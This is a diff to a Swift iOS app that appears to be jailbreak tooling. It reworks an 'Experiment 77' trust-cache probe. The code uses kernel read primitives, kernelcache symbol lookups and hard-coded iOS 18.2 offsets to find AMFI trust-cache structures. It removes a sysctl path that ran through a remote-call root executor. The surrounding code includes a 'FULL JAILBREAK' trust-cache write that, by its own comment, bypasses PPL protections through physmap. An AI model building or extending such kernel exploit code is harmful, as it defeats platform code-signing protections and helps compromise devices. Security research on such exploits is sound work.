@@ -41,7 +41,20 @@ private enum PhysmapConstants {
     static let pmapCsAllowInvalidOffsetInData: UInt64 = 0x45b8
 
     /// __DATA slots referenced from AMFI code (analyze_kernelcache.py --trust-cache).
-    /// Matches `analyze_kernelcache.py --trust-cache` on iphone11b iOS 18.2 kernelcache.
+    /// Top slots from `analyze_kernelcache.py --trust-cache` (fast probe only).
+    static let trustCacheFastOffsetsInData: [UInt64] = [
+        0x3980, 0x3920, 0x3930, 0x2d0, 0x1a4, 0x2770, 0x38e0, 0x45b8,
+    ]
+
+    /// Mach-O symtab names (Documents/kernelcache) — primary path for Exp 77.
+    static let trustCacheKcacheSymbols: [String] = [
+        "_trustcache",
+        "_query_trust_cache",
+        "_load_trust_cache",
+        "_pmap_lookup_in_loaded_trust_caches",
+    ]
+
+    /// Full list (fallback only, capped at runtime).
     static let trustCacheGlobalOffsetsInData: [UInt64] = [
         0x45b8, 0x3980, 0x2d0, 0x1a4, 0x2770, 0x1f8, 0x48, 0xb4, 0x38e0, 0x68,
         0x24c, 0x2a0, 0x2f8, 0xc8, 0x3920, 0x3930, 0x208, 0x2780, 0x27ad, 0x38,
@@ -753,10 +766,22 @@ struct AMFIExperimentView: View {
         }
     }
 
-    /// Probe = KRW scan + sysctl (root RC, bukan amfid — tidak hang).
+    /// Probe = KRW-only (no launchd). sysctl/RC was causing 3+ min hangs with no UI update.
     private func runExp77Probe() {
-        runExperiment(label: "TC Probe", operation: "exp77_probe", append: true) { rc in
-            self.expTrustCacheProbeSafe(rc: rc)
+        isRunning = true
+        runningLabel = "TC Probe"
+        guard mgr.dsready, PhysmapConstants.isVerified else {
+            isRunning = false
+            runningLabel = ""
+            return
+        }
+        DispatchQueue.global(qos: .userInitiated).async {
+            let result = self.expTrustCacheProbeSafe()
+            DispatchQueue.main.async {
+                self.results.insert(result, at: 0)
+                self.isRunning = false
+                self.runningLabel = ""
+            }
         }
     }
 
@@ -4157,12 +4182,12 @@ struct AMFIExperimentView: View {
     
     // MARK: - Experiment 77: Trust Cache Probe (safe) + Inject (physmap)
 
-    /// Read-only probe: __DATA globals → heap struct (PAC strip), no __ppl_data / physmap.
-    private func expTrustCacheProbeSafe(rc: RemoteCall? = nil) -> ExperimentResult {
+    /// Fast kernelcache-guided probe: symtab → few __DATA slots → optional short fallback.
+    private func expTrustCacheProbeSafe() -> ExperimentResult {
         let expName = "Trust Cache Probe (Exp 77)"
         var detail = "Experiment 77: Trust Cache Probe (read-only, KRW-safe)\n"
         detail += "====================================================\n\n"
-        detail += "Mode: __DATA pointer scan + heap verify (tanpa __ppl_data / physmap)\n\n"
+        detail += "Mode: kernelcache symtab + fast __DATA (KRW-only, ~1–5s)\n\n"
 
         guard PhysmapConstants.isVerified else {
             detail += "❌ Jalankan Physmap Access (Exp 74) dulu.\n"
@@ -4244,68 +4269,44 @@ struct AMFIExperimentView: View {
             }
         }
 
-        detail += "=== Kernelcache targets (\(PhysmapConstants.trustCacheGlobalOffsetsInData.count) __DATA slots) ===\n"
-        for off in PhysmapConstants.trustCacheGlobalOffsetsInData {
-            probeGlobalSlot(off, label: "kc+0x\(String(format: "%x", off))")
-            if tcStructAddr != 0 { break }
+        detail += "=== Kernelcache symtab (Documents/kernelcache) ===\n"
+        for sym in PhysmapConstants.trustCacheKcacheSymbols {
+            let unslid = ds_kcache_symbol_unslid(sym)
+            let runtime = ds_kcache_symbol_runtime(sym)
+            if runtime == 0 {
+                detail += "  \(sym): (not in symtab)\n"
+                continue
+            }
+            detail += "  \(sym): unslid=0x\(String(format: "%llx", unslid)) → runtime=0x\(String(format: "%llx", runtime))\n"
+            if tryTrustCacheAt(runtime, label: sym) { break }
+            let loaded = ds_kreadptr(runtime)
+            if loaded != 0, tryTrustCacheAt(loaded, label: "\(sym)@global") { break }
+            if loaded != 0, tryTrustCacheAt(ds_kreadsmrptr(runtime), label: "\(sym)@smr") { break }
+        }
+
+        if tcStructAddr == 0 {
+            detail += "\n=== Fast __DATA slots (\(PhysmapConstants.trustCacheFastOffsetsInData.count)) ===\n"
+            for off in PhysmapConstants.trustCacheFastOffsetsInData {
+                probeGlobalSlot(off, label: "kc+0x\(String(format: "%x", off))")
+                if tcStructAddr != 0 { break }
+            }
+        }
+
+        if tcStructAddr == 0 {
+            detail += "\n=== Fallback __DATA (max 12 extra) ===\n"
+            var extra = 0
+            for off in PhysmapConstants.trustCacheGlobalOffsetsInData {
+                if PhysmapConstants.trustCacheFastOffsetsInData.contains(off) { continue }
+                probeGlobalSlot(off, label: "kc+0x\(String(format: "%x", off))")
+                extra += 1
+                if tcStructAddr != 0 || extra >= 12 { break }
+            }
         }
 
         if tcStructAddr == 0, !probeDiag.isEmpty {
-            detail += "\n=== Probe diag (heap ptr, ver, count) ===\n"
-            for row in probeDiag {
+            detail += "\n=== Probe diag (ver/cnt sample) ===\n"
+            for row in probeDiag.prefix(6) {
                 detail += "  \(row.0): ptr=0x\(String(format: "%llx", row.1)) ver=\(row.2) cnt=\(row.3)\n"
-            }
-        }
-
-        if tcStructAddr == 0 {
-            detail += "\n=== Raw __DATA globals (top ADRP slots) ===\n"
-            let rawSlots: [UInt64] = [0x45b8, 0x3980, 0x2d0, 0x1a4, 0x2770, 0xe8, 0x248, 0xf8, 0x38e0, 0x3920, 0x3930]
-            for off in rawSlots {
-                let addr = dataSegBase &+ off
-                guard isSafeKernelKreadAddress(addr), !isInPPLDataRegion(addr, kernTextBase: kernBase) else {
-                    detail += "  kc+0x\(String(format: "%x", off)): (skip addr)\n"
-                    continue
-                }
-                let p = ds_kreadptr(addr)
-                let s = ds_kreadsmrptr(addr)
-                detail += "  kc+0x\(String(format: "%x", off)): ptr=0x\(String(format: "%llx", p)) smr=0x\(String(format: "%llx", s))\n"
-            }
-        }
-
-        if tcStructAddr == 0 {
-            detail += "\n=== XPF symbol resolve (needs fetched kernelcache) ===\n"
-            for sym in PhysmapConstants.trustCacheXpfSymbols {
-                let runtime = ds_xpf_resolve_runtime(sym)
-                if runtime == 0 {
-                    detail += "  \(sym): (not found)\n"
-                    continue
-                }
-                detail += "  \(sym): 0x\(String(format: "%llx", runtime))\n"
-            }
-        }
-
-        if tcStructAddr == 0, let rc {
-            detail += "\n=== sysctl (AMFI) ===\n"
-            let mem = rc.trojanMem
-            for mib in ["security.mac.amfi.trust_cache_count", "security.mac.amfi.trustcache.count"] {
-                let tcName = remote_alloc_str(rc, mib)
-                let tcBuf = mem + 0x2800
-                let tcSize = mem + 0x2A00
-                rc[tcBuf].setValue64(0)
-                rc[tcSize].setValue64(8)
-                let tcRet = RootExecutor.rcall(rc, "sysctlbyname", tcName, tcBuf, tcSize, 0, 0)
-                if tcRet == 0 {
-                    let n = rc[tcBuf].value64()
-                    if n != 0xffff_ffff_ffff_ffff && n < 100_000 {
-                        detail += "\(mib): \(n)\n"
-                    } else {
-                        detail += "\(mib): invalid read 0x\(String(format: "%llx", n))\n"
-                    }
-                } else {
-                    let err = Int64(bitPattern: tcRet)
-                    detail += "\(mib): gagal (ret=\(err))\n"
-                }
-                RootExecutor.rcall(rc, "free", tcName)
             }
         }
 
@@ -4353,7 +4354,7 @@ struct AMFIExperimentView: View {
     /// Writing through physmap bypasses PPL's page table protections entirely.
     private func expTrustCacheWrite(rc: RemoteCall?, dryRun: Bool = false) -> ExperimentResult {
         if dryRun {
-            return expTrustCacheProbeSafe(rc: rc)
+            return expTrustCacheProbeSafe()
         }
 
         let expName = "🏆 FULL JAILBREAK (Exp 77)"
